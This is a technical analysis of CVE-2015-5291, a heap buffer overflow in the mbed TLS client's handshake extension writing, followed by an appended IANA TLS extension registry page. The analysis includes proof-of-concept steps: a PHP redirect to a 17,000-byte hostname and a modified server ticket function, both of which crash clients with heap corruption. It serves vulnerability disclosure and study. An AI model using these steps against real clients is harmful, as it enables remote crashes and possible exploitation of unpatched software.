Invocation

These functions are invoked in the following order in the function ssl_write_client_hello() in
library/ssl_cli.c :

756     // First write extensions, then the total length
757     //
758 #if defined(MBEDTLS_SSL_SERVER_NAME_INDICATION)
759     ssl_write_hostname_ext( ssl, p + 2 + ext_len, &olen );
760     ext_len += olen;
761 #endif
762
763 #if defined(MBEDTLS_SSL_RENEGOTIATION)
764     ssl_write_renegotiation_ext( ssl, p + 2 + ext_len, &olen );
765     ext_len += olen;
766 #endif
767
768 #if defined(MBEDTLS_SSL_PROTO_TLS1_2) && \
769     defined(MBEDTLS_KEY_EXCHANGE__WITH_CERT__ENABLED)
770     ssl_write_signature_algorithms_ext( ssl, p + 2 + ext_len, &olen );
771     ext_len += olen;
772 #endif
773
774 #if defined(MBEDTLS_ECDH_C) || defined(MBEDTLS_ECDSA_C)
775     ssl_write_supported_elliptic_curves_ext( ssl, p + 2 + ext_len,
&olen );
776     ext_len += olen;
777
778     ssl_write_supported_point_formats_ext( ssl, p + 2 + ext_len, &olen );
779     ext_len += olen;
780 #endif
781

782 #if defined(MBEDTLS_SSL_MAX_FRAGMENT_LENGTH)
783     ssl_write_max_fragment_length_ext( ssl, p + 2 + ext_len, &olen );
784     ext_len += olen;
785 #endif
786
787 #if defined(MBEDTLS_SSL_TRUNCATED_HMAC)
788     ssl_write_truncated_hmac_ext( ssl, p + 2 + ext_len, &olen );
789     ext_len += olen;
790 #endif
791
792 #if defined(MBEDTLS_SSL_ENCRYPT_THEN_MAC)
793     ssl_write_encrypt_then_mac_ext( ssl, p + 2 + ext_len, &olen );
794     ext_len += olen;
795 #endif
796
797 #if defined(MBEDTLS_SSL_EXTENDED_MASTER_SECRET)
798     ssl_write_extended_ms_ext( ssl, p + 2 + ext_len, &olen );
799     ext_len += olen;
800 #endif
801
802 #if defined(MBEDTLS_SSL_SESSION_TICKETS)
803     ssl_write_session_ticket_ext( ssl, p + 2 + ext_len, &olen );
804     ext_len += olen;
805 #endif
806
807 #if defined(MBEDTLS_SSL_ALPN)
808     ssl_write_alpn_ext( ssl, p + 2 + ext_len, &olen );
809     ext_len += olen;
810 #endif
811

Walkthrough of the extension functions and amount of data consumed

ssl_write_hostname_ext

If ssl->hostname is not set, then no data is written; if ssl->hostname is set (using
mbedtls_ssl_set_hostname in library/ssl_tls.c), then writing to the output buffer will commence, in the
following fashion:

  93     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SERVERNAME >> 8 ) &
0xFF );
  94     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SERVERNAME      ) &
0xFF );
  95
  96     *p++ = (unsigned char)( ( (hostname_len + 5) >> 8 ) & 0xFF );
  97     *p++ = (unsigned char)( ( (hostname_len + 5)      ) & 0xFF );
  98
  99     *p++ = (unsigned char)( ( (hostname_len + 3) >> 8 ) & 0xFF );
 100     *p++ = (unsigned char)( ( (hostname_len + 3)      ) & 0xFF );
 101
 102     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SERVERNAME_HOSTNAME ) &
0xFF );
 103     *p++ = (unsigned char)( ( hostname_len >> 8 ) & 0xFF );
 104     *p++ = (unsigned char)( ( hostname_len      ) & 0xFF );
 105
 106     memcpy( p, ssl->hostname, hostname_len );

 107
 108     *olen = hostname_len + 9;

Here it can be observed that 9 bytes are consumed by various metadata about the extension and the
hostname string, and a variable amount of bytes are consumed by the hostname string itself.

For the sake of clarity I'll point out that hostname_len is the length of ssl->hostname (interpreted as a
null-terminated string). ssl->hostname and and ssl->hostname_len are defined in
mbedtls_ssl_hostname() in library/ssl_tls.c:

5593 int mbedtls_ssl_set_hostname( mbedtls_ssl_context *ssl, const char
*hostname )
5594 {
5595     size_t hostname_len;
5596
5597     if( hostname == NULL )
5598         return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
5599
5600     hostname_len = strlen( hostname );
5601
5602     if( hostname_len + 1 == 0 )
5603         return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
5604
5605     ssl->hostname = mbedtls_calloc( 1, hostname_len + 1 );
5606
5607     if( ssl->hostname == NULL )
5608         return( MBEDTLS_ERR_SSL_ALLOC_FAILED );
5609
5610     memcpy( ssl->hostname, hostname, hostname_len );
5611
5612     ssl->hostname[hostname_len] = '\0';
5613
5614     return( 0 );
5615 }

Added to output buffer: 9 to (9 + unlimited

 5  ) bytes.

ssl_write_renegotiation_ext

129     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_RENEGOTIATION_INFO >> 8 ) &
0xFF );
130     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_RENEGOTIATION_INFO      ) &
0xFF );
131
132     *p++ = 0x00;
133     *p++ = ( ssl->verify_data_len + 1 ) & 0xFF;
134     *p++ = ssl->verify_data_len & 0xFF;
135
136     memcpy( p, ssl->own_verify_data, ssl->verify_data_len );
137
138     *olen = 5 + ssl->verify_data_len;

5

“unlimited” here means that the library itself doesn't possess a bounding mechanism and in practice its size is only
limited by the system's allocation limits and the architectural strictures that underpin it.

ssl->verify_data and ssl->verify_data_len are defined at two places in the library:

In mbedtls_ssl_write_finished() in library/ssl_tls.c:

4945     // TODO TLS/1.2 Hash length is determined by cipher suite (Page 63)
4946     hash_len = ( ssl->minor_ver == MBEDTLS_SSL_MINOR_VERSION_0 ) ? 36 :
12;
4947
4948 #if defined(MBEDTLS_SSL_RENEGOTIATION)
4949     ssl->verify_data_len = hash_len;
4950     memcpy( ssl->own_verify_data, ssl->out_msg + 4, hash_len );
4951 #endif

and in mbedtls_ssl_parse_finished() in library/ssl_tls.c:

5068 #if defined(MBEDTLS_SSL_PROTO_SSL3)
5069     if( ssl->minor_ver == MBEDTLS_SSL_MINOR_VERSION_0 )
5070         hash_len = 36;
5071     else
5072 #endif
5073         hash_len = 12;
....
5089 #if defined(MBEDTLS_SSL_RENEGOTIATION)
5090     ssl->verify_data_len = hash_len;
5091     memcpy( ssl->peer_verify_data, buf, hash_len );
5092 #endif

Added to output buffer: either 12 or 36 bytes.

ssl_write_signature_algorithms_ext

154 #if defined(MBEDTLS_RSA_C) || defined(MBEDTLS_ECDSA_C)
155     unsigned char *sig_alg_list = buf + 6;
156 #endif
...
...
165     /*
166      * Prepare signature_algorithms extension (TLS 1.2)
167      */
168     for( md = ssl->conf->sig_hashes; *md != MBEDTLS_MD_NONE; md++ )
169     {
170 #if defined(MBEDTLS_ECDSA_C)
171         sig_alg_list[sig_alg_len++] =
mbedtls_ssl_hash_from_md_alg( *md );
172         sig_alg_list[sig_alg_len++] = MBEDTLS_SSL_SIG_ECDSA;
173 #endif
174 #if defined(MBEDTLS_RSA_C)
175         sig_alg_list[sig_alg_len++] =
mbedtls_ssl_hash_from_md_alg( *md );
176         sig_alg_list[sig_alg_len++] = MBEDTLS_SSL_SIG_RSA;
177 #endif
178     }
...
...
197     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SIG_ALG >> 8 ) & 0xFF );
198     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SIG_ALG      ) & 0xFF );
199

200     *p++ = (unsigned char)( ( ( sig_alg_len + 2 ) >> 8 ) & 0xFF );
201     *p++ = (unsigned char)( ( ( sig_alg_len + 2 )      ) & 0xFF );
202
203     *p++ = (unsigned char)( ( sig_alg_len >> 8 ) & 0xFF );
204     *p++ = (unsigned char)( ( sig_alg_len      ) & 0xFF );
205
206     *olen = 6 + sig_alg_len;

The ssl->conf->sig_hashes list can be manually set using mbedtls_ssl_conf_sig_hashes() in
library/ssl_tls.c. If the default configuration is enabled using mbedtls_ssl_config_defaults() in
library/ssl_tls.c, then ssl->conf->sig_hashes will either be:

7096             conf->sig_hashes = ssl_preset_suiteb_hashes;

or

7129             conf->sig_hashes = mbedtls_md_list();

depending on the 'preset' variable passed to this function.

Added to output buffer: variable but smallish.

ssl_write_supported_elliptic_curves_ext

217     unsigned char *elliptic_curve_list = p + 6;
...
...
230 #if defined(MBEDTLS_ECP_C)
231     for( grp_id = ssl->conf->curve_list; *grp_id != MBEDTLS_ECP_DP_NONE;
grp_id++ )
232     {
233         info = mbedtls_ecp_curve_info_from_grp_id( *grp_id );
234 #else
235     for( info = mbedtls_ecp_curve_list(); info->grp_id !=
MBEDTLS_ECP_DP_NONE; info++ )
236     {
237 #endif
238
239         elliptic_curve_list[elliptic_curve_len++] = info->tls_id >> 8;
240         elliptic_curve_list[elliptic_curve_len++] = info->tls_id & 0xFF;
241     }
242
243     if( elliptic_curve_len == 0 )
244         return;
245
246     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SUPPORTED_ELLIPTIC_CURVES
>> 8 ) & 0xFF );
247     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SUPPORTED_ELLIPTIC_CURVES
) & 0xFF );
248
249     *p++ = (unsigned char)( ( ( elliptic_curve_len + 2 ) >> 8 ) & 0xFF );
250     *p++ = (unsigned char)( ( ( elliptic_curve_len + 2 )      ) & 0xFF );
251
252     *p++ = (unsigned char)( ( ( elliptic_curve_len     ) >> 8 ) & 0xFF );
253     *p++ = (unsigned char)( ( ( elliptic_curve_len     )      ) & 0xFF );
254
255     *olen = 6 + elliptic_curve_len;

The ssl->conf->curve_list list can be manually set using mbedtls_ssl_conf_curves() in library/ssl_tls.c.
If the default configuration is enabled using mbedtls_ssl_config_defaults() in library/ssl_tls.c, then ssl-
>conf->curve_list will either be:

7100             conf->curve_list = ssl_preset_suiteb_curves;

or

7133             conf->curve_list = mbedtls_ecp_grp_id_list();

depending on the 'preset' variable passed to this function.

Added to output buffer: variable but smallish.

ssl_write_supported_point_formats_ext

269     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SUPPORTED_POINT_FORMATS >>
8 ) & 0xFF );
270     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SUPPORTED_POINT_FORMATS
) & 0xFF );
271
272     *p++ = 0x00;
273     *p++ = 2;
274
275     *p++ = 1;
276     *p++ = MBEDTLS_ECP_PF_UNCOMPRESSED;
277
278     *olen = 6;

Added to output buffer: 6 bytes.

ssl_write_max_fragment_length_ext

296     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_MAX_FRAGMENT_LENGTH >> 8 )
& 0xFF );
297     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_MAX_FRAGMENT_LENGTH      )
& 0xFF );
298
299     *p++ = 0x00;
300     *p++ = 1;
301
302     *p++ = ssl->conf->mfl_code;
303
304     *olen = 5;

Added to output buffer: 5 bytes.

ssl_write_truncated_hmac_ext

 322     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_TRUNCATED_HMAC >> 8 ) &
0xFF );
 323     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_TRUNCATED_HMAC      ) &

0xFF );
 324
 325     *p++ = 0x00;
 326     *p++ = 0x00;
 327
 328     *olen = 4;

Added to output buffer: 4 bytes.

ssl_write_encrypt_then_mac_ext

 348     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_ENCRYPT_THEN_MAC >> 8 ) &
0xFF );
 349     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_ENCRYPT_THEN_MAC      ) &
0xFF );
 350
 351     *p++ = 0x00;
 352     *p++ = 0x00;
 353
 354     *olen = 4;

Added to output buffer: 4 bytes.

ssl_write_extended_ms_ext

 374     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_EXTENDED_MASTER_SECRET >>
8 ) & 0xFF );
 375     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_EXTENDED_MASTER_SECRET
) & 0xFF );
 376
 377     *p++ = 0x00;
 378     *p++ = 0x00;
 379
 380     *olen = 4;

Added to output buffer: 4 bytes.

ssl_write_session_ticket_ext

389     size_t tlen = ssl->session_negotiate->ticket_len;
...
...
399     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SESSION_TICKET >> 8 ) &
0xFF );
400     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_SESSION_TICKET      ) &
0xFF );
401
402     *p++ = (unsigned char)( ( tlen >> 8 ) & 0xFF );
403     *p++ = (unsigned char)( ( tlen      ) & 0xFF );
404
405     *olen = 4;
...
...

415     memcpy( p, ssl->session_negotiate->ticket, tlen );
416
417     *olen += tlen;

ssl->session_negotiate->ticket and ssl->session_negotiate->ticket_len are set in
ssl_parse_new_session_ticket() in library/ssl_cli.c:

2899     ticket_len = ( msg[4] << 8 ) | ( msg[5] );
2900
2901     if( ticket_len + 6 + mbedtls_ssl_hs_hdr_len( ssl ) != ssl-
>in_hslen )
2902     {
2903         MBEDTLS_SSL_DEBUG_MSG( 1, ( "bad new session ticket
message" ) );
2904         return( MBEDTLS_ERR_SSL_BAD_HS_NEW_SESSION_TICKET );
2905     }
...
...
2926     if( ( ticket = mbedtls_calloc( 1, ticket_len ) ) == NULL )
2927     {
2928         MBEDTLS_SSL_DEBUG_MSG( 1, ( "ticket alloc failed" ) );
2929         return( MBEDTLS_ERR_SSL_ALLOC_FAILED );
2930     }
2931
2932     memcpy( ticket, msg + 6, ticket_len );
2933
2934     ssl->session_negotiate->ticket = ticket;
2935     ssl->session_negotiate->ticket_len = ticket_len;

ssl_parse_new_session_ticket() is invoked in the
MBEDTLS_SSL_SERVER_NEW_SESSION_TICKET stage of the handshake in
mbedtls_ssl_handshake_client_step() in library/ssl_cli.c:

3059        case MBEDTLS_SSL_SERVER_NEW_SESSION_TICKET:
3060            ret = ssl_parse_new_session_ticket( ssl );
3061            break;

Crucial in understanding CVE-2015-5291 is the interplay between these two functions.

The remote end (which in this case is the server, since the vulnerability only affects the client part of
the library) is free to send an arbitrarily sized block of data to the client. Its maximum size is 64 kb as
implied by the two bytes used to encode the size (line 2899 in ssl_parse_new_session_ticket()). Even if
64 kb exceeds the client's allocation limit, the library will gracefully halt the handshake and return with
an error code to its caller (line 2926). If it succeeds, the relevant internal state variables ssl-
>session_negotiate->ticket and ssl->session_negotiate->ticket_len are set to the right values.

However, upon echoing the ticket back the the server in ssl_write_session_ticket_ext(), the entire ticket
chunk is memcpy()'ied into the client's output buffer (line 415 in ssl_write_session_ticket_ext()).

Added to output buffer: 4  to (4 + 0xFFFF = 65539) bytes.

ssl_write_alpn_ext

436     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_ALPN >> 8 ) & 0xFF );

437     *p++ = (unsigned char)( ( MBEDTLS_TLS_EXT_ALPN      ) & 0xFF );
448     p += 4;
449
450     for( cur = ssl->conf->alpn_list; *cur != NULL; cur++ )
451     {
452         *p = (unsigned char)( strlen( *cur ) & 0xFF );
453         memcpy( p + 1, *cur, *p );
454         p += 1 + *p;
455     }
456
457     *olen = p - buf;
458
459     /* List length = olen - 2 (ext_type) - 2 (ext_len) - 2 (list_len) */
460     buf[4] = (unsigned char)( ( ( *olen - 6 ) >> 8 ) & 0xFF );
461     buf[5] = (unsigned char)( ( ( *olen - 6 )      ) & 0xFF );
462
463     /* Extension length = olen - 2 (ext_type) - 2 (ext_len) */
464     buf[2] = (unsigned char)( ( ( *olen - 4 ) >> 8 ) & 0xFF );
465     buf[3] = (unsigned char)( ( ( *olen - 4 )      ) & 0xFF );

Ssl->conf->alpn_list can be defined by the parent application that utilizes the library, using the
mbedtls_ssl_conf_alpn_protocols() function in library/ssl_tls.c:

5630 int mbedtls_ssl_conf_alpn_protocols( mbedtls_ssl_config *conf, const
char **protos )
5631 {
5632     size_t cur_len, tot_len;
5633     const char **p;
5634
5635     /*
5636      * "Empty strings MUST NOT be included and byte strings MUST NOT be
5637      * truncated". Check lengths now rather than later.
5638      */
5639     tot_len = 0;
5640     for( p = protos; *p != NULL; p++ )
5641     {
5642         cur_len = strlen( *p );
5643         tot_len += cur_len;
5644
5645         if( cur_len == 0 || cur_len > 255 || tot_len > 65535 )
5646             return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
5647     }
5648
5649     conf->alpn_list = protos;
5650
5651     return( 0 );
5652 }

This function ensures that each individual ALPN string does not exceed 255 bytes, and the combined
size does not exceed 64 kb, in accordance with the specifications expressed in RFC 73016.

Added to output buffer: 6 to (6 + 65535 = 65541) bytes.

6

https://tools.ietf.org/html/rfc7301

Summary

Function

Amount of bytes consumed

Size can be controlled remotely

ssl_write_hostname_ext

9 - unlimited

Sometimes, such as in curl
compiled with the library (see
below).

ssl_write_renegotiation_ext

Either 12 or 36

ssl_write_signature_algorithms_
ext

ssl_write_supported_elliptic_cur
ves_ext

ssl_write_supported_point_form
ats_ext

ssl_write_max_fragment_length
_ext

ssl_write_truncated_hmac_ext

variable but small

variable but small

6

5

4

ssl_write_encrypt_then_mac_ext 4

ssl_write_extended_ms_ext

4

ssl_write_session_ticket_ext

4 to (4 + 65535 = 65539)

Yes

Unlikely

Unlikely

No

No

No

No

No

Yes

ssl_write_alpn_ext

6 to (6 + 65535 = 65541)

Unlikely

How to cause heap corruption in the client

There are three functions whose upper bound exceeds the library's default output buffer of 16 kilobytes:

•

•

•

ssl_write_alpn_ext

ssl_write_hostname_ext

ssl_write_session_ticket_ext

ssl_write_alpn_ext

Only if the server can control the client's supported Application Layer Protocols, which can only be set
via mbedtls_ssl_conf_alpn_protocols, remote heap corruption is possible. This is unlikely.

ssl_write_hostname_ext

The first one, ssl_write_hostname_ext will usually write an amount of bytes under or around 256 bytes,
since this is limit imposed by the Domain Name System (DNS) and any host name exceeding that
amount will be unable to resolve to an IP address. Since an IP address is required to initiate a
handshake, and thus the corruption of the heap cannot occur if we assume that a valid DNS lookup of,
say, a host name 17 kilobytes in size, is impossible, it is tempting to disregard (remote or local) the
possibility of exploitation via ssl_write_hostname_ext in a decently programmed software.

However, exceptions to this rule exist. A system's mechanism for translating host names to IP addresses
is sometimes not singularly based on valid DNS queries; Linux, for instance, allows custom host names
to be defined in /etc/hosts.

I have been able to remotely cause a segmentation fault in curl+PolarSSL by following these steps:

Create a PHP file on your web server:

<?php
    $hostname = str_repeat("y", 17000);
    header("Location: https://" . $hostname . ":80");
?>

Obviously, this will redirect curl (the command-line binary) to the ~ 17 kilobyte host name
“yyyyyyyy...” if it is invoked with –location that will enable following redirects. In my /etc/hosts file, I
placed exactly this 17000 bytes wide string preceded with “127.0.0.1”, so that a lookup of that
hostname would resolve to 127.0.0.1. On localhost I ran a TLS server. This process caused curl to
crash.

It follows that if an attacker can control or influence the hostname-IP pairs available to a client's
lookup, exploitation might be possible.

ssl_write_session_ticket_ext

SSL session tickets are enabled by default in the library. The condition under which exploitation is
possible is that the client will reuse it's context (ie., the set of internal state variables pertaining to a
certain outbound connection) once.

In library/ssl_ticket.c, change mbed_tls_ticket_write() to something like this:

285 int mbedtls_ssl_ticket_write( void *p_ticket,
286                               const mbedtls_ssl_session *session,
287                               unsigned char *start,
288                               const unsigned char *end,
289                               size_t *tlen,
290                               uint32_t *ticket_lifetime )
291 {
292     int ret;
293     mbedtls_ssl_ticket_context *ctx = p_ticket;
294     unsigned char *key_name = start;
295     unsigned char *iv = start + 4;
296     unsigned char *state_len_bytes = iv + 12;
297     unsigned char *state = state_len_bytes + 2;
298     size_t clear_len;

299
300     clear_len = 16300;
301     if( ctx == NULL || ctx->f_rng == NULL )
302         return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );
303
304     memset(state, 0, clear_len);
305     state_len_bytes[0] = ( clear_len >> 8 ) & 0xff;
306     state_len_bytes[1] = ( clear_len      ) & 0xff;
307
308     *tlen = 4 + 12 + 2 + 16 + clear_len;
309
310 #if defined(MBEDTLS_THREADING_C)
311     if( mbedtls_mutex_unlock( &ctx->mutex ) != 0 )
312         return( MBEDTLS_ERR_THREADING_MUTEX_ERROR );
313 #endif
314
315     return 0;
316 }

And be sure to increase it's own buffer size (or else it will corrupt its own heap):

in include/mbedtls/ssl.h:

 232 #if !defined(MBEDTLS_SSL_MAX_CONTENT_LEN)
 233 #define MBEDTLS_SSL_MAX_CONTENT_LEN         (1024*1024)   /**< Size of
the input / output buffer */
 234 #endif

Run the server:

$ programs/ssl/ssl_server2

  . Seeding the random number generator... ok
  . Loading the CA root certificate ... ok (0 skipped)
  . Loading the server cert. and key... ok
  . Bind on tcp://*:4433/ ... ok
  . Setting up the SSL/TLS structure... ok
  . Waiting for a remote connection …

Run the client:

$ programs/ssl/ssl_client2 reconnect=1 reco_delay=1

  . Seeding the random number generator... ok
  . Loading the CA root certificate ... ok (0 skipped)
  . Loading the client cert. and key... ok
  . Connecting to tcp/localhost/4433... ok
  . Setting up the SSL/TLS structure... ok
  . Performing the SSL/TLS handshake... ok
    [ Protocol is TLSv1.2 ]
    [ Ciphersuite is TLS-ECDHE-ECDSA-WITH-AES-256-GCM-SHA384 ]
    [ Record expansion is 29 ]
    [ Maximum fragment length is 16384 ]
  . Saving session for reuse... ok
  . Verifying peer X.509 certificate... ok
  . Peer certificate information    ...
      cert. version     : 3

      serial number     : 09
      issuer name       : C=NL, O=PolarSSL, CN=Polarssl Test EC CA
      subject name      : C=NL, O=PolarSSL, CN=localhost
      issued  on        : 2013-09-24 15:52:04
      expires on        : 2023-09-22 15:52:04
      signed using      : ECDSA with SHA256
      EC key size       : 256 bits
      basic constraints : CA=false

  > Write to server: 34 bytes written in 1 fragments

GET / HTTP/1.0
Extra-header:

  < Read from server: 152 bytes read

HTTP/1.0 200 OK
Content-Type: text/html

<h2>mbed TLS Test Server</h2>
<p>Successful connection using: TLS-ECDHE-ECDSA-WITH-AES-256-GCM-SHA384</p>
  . Closing the connection... done
  . Reconnecting with saved session...*** Error in
`programs/ssl/ssl_client2': free(): invalid pointer: 0x000000000224ce80 ***
Aborted (core dumped)

This is what is happening here:

1. Client connects to the server.
2. Server gives client a session ticket, client stores this session ticket.
3. Regular transmission takes place between the client and the server and the connection is closed.
4. The client reconnects to the server, sends its stored session ticket, and because its size exceeds

the current space left in the client's output buffer, it corrupts its own heap.

How the extension functions are interlinked

It must be borne in mind that, while remote heap corruption can be achieved by one singular extension,
the extent of the heap corruption itself depends also on the amount of data written by preceding
extension functions invoked.

Let's again consider the order in which the extension functions are invoked in ssl_write_client_hello()
in library/ssl_cli.c:

759     ssl_write_hostname_ext( ssl, p + 2 + ext_len, &olen );
764     ssl_write_renegotiation_ext( ssl, p + 2 + ext_len, &olen );
770     ssl_write_signature_algorithms_ext( ssl, p + 2 + ext_len, &olen );
775     ssl_write_supported_elliptic_curves_ext( ssl, p + 2 + ext_len,
&olen );
778     ssl_write_supported_point_formats_ext( ssl, p + 2 + ext_len, &olen );
783     ssl_write_max_fragment_length_ext( ssl, p + 2 + ext_len, &olen );
788     ssl_write_truncated_hmac_ext( ssl, p + 2 + ext_len, &olen );
793     ssl_write_encrypt_then_mac_ext( ssl, p + 2 + ext_len, &olen );
798     ssl_write_extended_ms_ext( ssl, p + 2 + ext_len, &olen );
803     ssl_write_session_ticket_ext( ssl, p + 2 + ext_len, &olen );
808     ssl_write_alpn_ext( ssl, p + 2 + ext_len, &olen );

It makes a difference if the host name is only 10 or 100 bytes wide; the host name data is written before
ssl_write_session_ticket_ext() is invoked, and the difference in the length of the host name implies how
much data can be written outside of buffer bounds.

In other words, the effect is accumulative. To the attacker, this property can be helpful, since this offers
them a degree of granularity that may aid in successfully exploiting the vulnerability for whatever
malicious idea they have in mind.



=== Content from www.iana.org_6a542446_20250126_093426.html ===

[![Internet Assigned Numbers Authority](https://www.iana.org/_img/2022/iana-logo-header.svg)](/)

# Transport Layer Security (TLS) Extensions

Created
2005-11-15
Last Updated
2024-12-06
Available Formats
[![](/_img/icons/text-xml.png)
XML](tls-extensiontype-values.xml)
[![](/_img/icons/text-html.png)
HTML](tls-extensiontype-values.xhtml)
[![](/_img/icons/text-plain.png)
Plain text](tls-extensiontype-values.txt)

**Registries included below**

* [TLS ExtensionType Values](#tls-extensiontype-values-1)
* [TLS Certificate Types](#tls-extensiontype-values-3)
* [TLS Certificate Status Types](#certificate-status)
* [TLS Application-Layer Protocol Negotiation (ALPN) Protocol IDs](#alpn-protocol-ids)
* [TLS CachedInformationType Values](#cachedinformationtype)
* [TLS Certificate Compression Algorithm IDs](#tls-certificate-compression-algorithm-ids)

## TLS ExtensionType Values

Registration Procedure(s)
```
Specification Required
```

Expert(s)
```
Yoav Nir, Rich Salz, Nick Sullivan
```

Reference
[[RFC8446](https://www.iana.org/go/rfc8446)][[RFC8447](https://www.iana.org/go/rfc8447)][[RFC9146](https://www.iana.org/go/rfc9146)]
Note
```
Registration requests should be sent to the mailing list described
in [[RFC 8447, Section 17](https://www.iana.org/go/rfc8447)]. If approved, designated experts should
notify IANA within three weeks. For assistance, please contact
iana@iana.org.

```

Note
```
The role of the designated expert is described in [[RFC8447](https://www.iana.org/go/rfc8447)].
The designated expert [[RFC8126](https://www.iana.org/go/rfc8126)] ensures that the specification is
publicly available.  It is sufficient to have an Internet-Draft
(that is posted and never published as an RFC) or a document from
another standards body, industry consortium, university site, etc.
The expert may provide more in-depth reviews, but their approval
should not be taken as an endorsement of the extension.

```

Note
```
As specified in [[RFC8126](https://www.iana.org/go/rfc8126)], assignments made in the Private Use
space are not generally useful for broad interoperability.  It is
the responsibility of those making use of the Private Use range to
ensure that no conflicts occur (within the intended scope of use).
For widespread experiments, temporary reservations are available.

```

Note
```
If an item is not marked as "Recommended", it does not
necessarily mean that it is flawed; rather, it indicates that the
item either has not been through the IETF consensus process, has
limited applicability, or is intended only for specific use cases.

```

Note
```
The addition of the "CR" to the "TLS 1.3" column for the
server_name(0) extension only marks the extension as valid in a
ClientCertificateRequest created as part of client-generated
authenticator requests.

```

Available Formats
[![](/_img/icons/text-csv.png)
CSV](tls-extensiontype-values-1.csv)

| Value | Extension Name | TLS 1.3 | DTLS-Only | Recommended | Reference |
| --- | --- | --- | --- | --- | --- |
| 0 | server\_name | CH, EE, CR | N | Y | [[RFC6066](https://www.iana.org/go/rfc6066)][[RFC9261](https://www.iana.org/go/rfc9261)] |
| 1 | max\_fragment\_length | CH, EE | N | N | [[RFC6066](https://www.iana.org/go/rfc6066)][[RFC8449](https://www.iana.org/go/rfc8449)] |
| 2 | client\_certificate\_url | - | N | Y | [[RFC6066](https://www.iana.org/go/rfc6066)] |
| 3 | trusted\_ca\_keys | - | N | Y | [[RFC6066](https://www.iana.org/go/rfc6066)] |
| 4 | truncated\_hmac | - | N | N | [[RFC6066](https://www.iana.org/go/rfc6066)][[IESG Action 2018-08-16](https://www.ietf.org/about/groups/iesg/minutes/2018/)] |
| 5 | status\_request | CH, CR, CT | N | Y | [[RFC6066](https://www.iana.org/go/rfc6066)] |
| 6 | user\_mapping | - | N | Y | [[RFC4681](https://www.iana.org/go/rfc4681)] |
| 7 | client\_authz | - | N | N | [[RFC5878](https://www.iana.org/go/rfc5878)] |
| 8 | server\_authz | - | N | N | [[RFC5878](https://www.iana.org/go/rfc5878)] |
| 9 | cert\_type | - | N | N | [[RFC6091](https://www.iana.org/go/rfc6091)] |
| 10 | supported\_groups (renamed from "elliptic\_curves") | CH, EE | N | Y | [[RFC8422](https://www.iana.org/go/rfc8422)][[RFC7919](https://www.iana.org/go/rfc7919)] |
| 11 | ec\_point\_formats | - | N | Y | [[RFC8422](https://www.iana.org/go/rfc8422)] |
| 12 | srp | - | N | N | [[RFC5054](https://www.iana.org/go/rfc5054)] |
| 13 | signature\_algorithms | CH, CR | N | Y | [[RFC8446](https://www.iana.org/go/rfc8446)] |
| 14 | use\_srtp | CH, EE | N | Y | [[RFC5764](https://www.iana.org/go/rfc5764)] |
| 15 | heartbeat | CH, EE | N | Y | [[RFC6520](https://www.iana.org/go/rfc6520)] |
| 16 | application\_layer\_protocol\_negotiation | CH, EE | N | Y | [[RFC7301](https://www.iana.org/go/rfc7301)] |
| 17 | status\_request\_v2 | - | N | Y | [[RFC6961](https://www.iana.org/go/rfc6961)] |
| 18 | signed\_certificate\_timestamp | CH, CR, CT | N | N | [[RFC6962](https://www.iana.org/go/rfc6962)] |
| 19 | client\_certificate\_type | CH, EE | N | Y | [[RFC7250](https://www.iana.org/go/rfc7250)] |
| 20 | server\_certificate\_type | CH, EE | N | Y | [[RFC7250](https://www.iana.org/go/rfc7250)] |
| 21 | padding | CH | N | Y | [[RFC7685](https://www.iana.org/go/rfc7685)] |
| 22 | encrypt\_then\_mac | - | N | Y | [[RFC7366](https://www.iana.org/go/rfc7366)] |
| 23 | extended\_master\_secret | - | N | Y | [[RFC7627](https://www.iana.org/go/rfc7627)] |
| 24 | token\_binding | - | N | Y | [[RFC8472](https://www.iana.org/go/rfc8472)] |
| 25 | cached\_info | - | N | Y | [[RFC7924](https://www.iana.org/go/rfc7924)] |
| 26 | tls\_lts | - | N | N | [[draft-gutmann-tls-lts-11](https://www.iana.org/go/draft-gutmann-tls-lts-11)] |
| 27 | compress\_certificate | CH, CR | N | Y | [[RFC8879](https://www.iana.org/go/rfc8879)] |
| 28 | record\_size\_limit | CH, EE | N | Y | [[RFC8449](https://www.iana.org/go/rfc8449)] |
| 29 | pwd\_protect | CH | N | N | [[RFC8492](https://www.iana.org/go/rfc8492)] |
| 30 | pwd\_clear | CH | N | N | [[RFC8492](https://www.iana.org/go/rfc8492)] |
| 31 | password\_salt | CH, SH, HRR | N | N | [[RFC8492](https://www.iana.org/go/rfc8492)] |
| 32 | ticket\_pinning | CH, EE | N | N | [[RFC8672](https://www.iana.org/go/rfc8672)] |
| 33 | tls\_cert\_with\_extern\_psk | CH, SH | N | N | [[RFC8773](https://www.iana.org/go/rfc8773)] |
| 34 | delegated\_credential | CH, CR, CT | N | Y | [[RFC9345](https://www.iana.org/go/rfc9345)] |
| 35 | session\_ticket (renamed from "SessionTicket TLS") | - | N | Y | [[RFC5077](https://www.iana.org/go/rfc5077)][[RFC8447](https://www.iana.org/go/rfc8447)] |
